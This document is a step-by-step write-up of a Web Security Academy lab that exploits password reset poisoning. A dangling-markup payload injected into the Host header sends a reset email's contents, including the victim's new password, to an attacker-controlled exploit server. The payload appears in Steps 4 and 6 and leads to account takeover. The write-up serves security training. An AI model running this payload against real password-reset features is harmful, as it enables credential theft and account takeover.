# Exploiting Password Reset Poisoning via Dangling Markup

This guide delivers a clear, creative, and organized walkthrough to exploit a **password reset poisoning** vulnerability using a dangling markup attack. Picture yourself as a digital saboteur, weaving a trap in the server’s email system to steal a victim’s password! The objective is to inject a malicious `Host` header with dangling markup to redirect sensitive email content (including `carlos`’s password) to your exploit server, enabling account takeover to solve the lab.

## Objective
Poison the password reset email by injecting dangling markup via the `Host` header, capture `carlos`’s new password in your exploit server’s log, and log in as `carlos` to complete the lab.

## Prerequisites
- Burp Suite with Proxy and Repeater modules configured.
- Access to the lab application with a login page and "Forgot your password?" feature.
- An exploit server (e.g., `YOUR-EXPLOIT-SERVER-ID.exploit-server.net`) provided by the lab.
- A lab-provided email client to view reset emails.

## Background on the Vulnerability
The password reset functionality sends a new password directly in the email body, with the URL constructed using the `Host` header. The email client renders HTML using DOMPurify for sanitization, but the raw HTML view is unsanitized. By injecting a non-numeric port with dangling markup (e.g., an unclosed `<a>` tag), attackers can manipulate the email’s HTML to exfiltrate the password to their exploit server.

## Steps to Solve the Lab

### Step 1: Test the Password Reset Functionality
1. Navigate to the login page and click **Forgot your password?**.
2. Request a password reset for your own account (enter your username).
3. Open the lab’s email client and check for the reset email.
4. **Observation**: The email links to the generic login page (no token) and includes the new password in the body text.

### Step 2: Analyze the Email Request
1. In Burp Suite, go to **Proxy > HTTP history** and locate the `GET /email` request for the email client.
2. **Observation**: The response HTML is sanitized by DOMPurify for rendering, but the email client’s raw HTML view is unsanitized.

### Step 3: Test Host Header Manipulation
1. In Proxy history, locate the `POST /forgot-password` request from the reset attempt.
2. Right-click and select **Send to Repeater**.
3. In Repeater, test the `Host` header with an arbitrary domain (e.g., `example.com`):
   ```
   Host: example.com
   ```
    ![payload suc](./img/Password%20reset%20poisoning%20via%20dangling%20markup/Password%20reset%20poisoning%20via%20dangling%20markup(1).png)

4. Send the request.
5. **Observation**: The server returns an error, indicating domain validation.
6. Test with a non-numeric port:
   ```
   Host: YOUR-LAB-ID.web-security-academy.net:localhost
   ```
    ![payload suc](./img/Password%20reset%20poisoning%20via%20dangling%20markup/Password%20reset%20poisoning%20via%20dangling%20markup(2).png)
    ![payload suc](./img/Password%20reset%20poisoning%20via%20dangling%20markup/Password%20reset%20poisoning%20via%20dangling%20markup(3).png)

7. Send the request and check the email client’s raw HTML view.
8. **Observation**: The port is reflected in a single-quoted link (e.g., `<a href='http://YOUR-LAB-ID.web-security-academy.net:localhost'>`), followed by the password, and is unsanitized.

### Step 4: Inject Dangling Markup
1. In Repeater, craft a `Host` header with dangling markup to break out of the link and redirect content:
   ```
   Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
   ```
   ![payload suc](./img/Password%20reset%20poisoning%20via%20dangling%20markup/Password%20reset%20poisoning%20via%20dangling%20markup(4).png)

2. Send the request.
3. Check the email client’s raw HTML view.
4. **Observation**: The email content is truncated after the injected `<a>` tag, indicating successful markup injection.

### Step 5: Capture the Leaked Password
1. Go to the exploit server and check the **Access Log**.
2. Locate the `GET` request starting with `/?/login'>`, which contains the rest of the email body, including your new password.
3. **Observation**: The dangling `<a>` tag caused the email content (including the password) to be sent to your exploit server.

![payload suc](./img/Password%20reset%20poisoning%20via%20dangling%20markup/Password%20reset%20poisoning%20via%20dangling%20markup(5).png)

### Step 6: Target Carlos’s Password
1. In Repeater, update the `POST /forgot-password` request:
   - Keep the malicious `Host` header:
     ```
     Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
     ```
   - Change the `username` parameter to `carlos`:
     ```
     username=carlos
     ```
2. Send the request.
3. Refresh the exploit server’s **Access Log**.
4. **Observation**: A new `GET` request contains `carlos`’s new password in the query string.

### Step 7: Log in as Carlos
1. Extract `carlos`’s password from the access log.
2. Log in to the application using `username=carlos` and the captured password.
3. **Observation**: Successful login solves the lab.

![payload suc](./img/Password%20reset%20poisoning%20via%20dangling%20markup/Password%20reset%20poisoning%20via%20dangling%20markup(6).png)

### Step 8: Verify Success
1. If the lab does not confirm completion, verify:
   - The `Host` header includes the correct dangling markup.
   - The `username=carlos` parameter is set.
   - The password was accurately extracted from the access log.
2. **Observation**: Logging in as `carlos` completes the lab.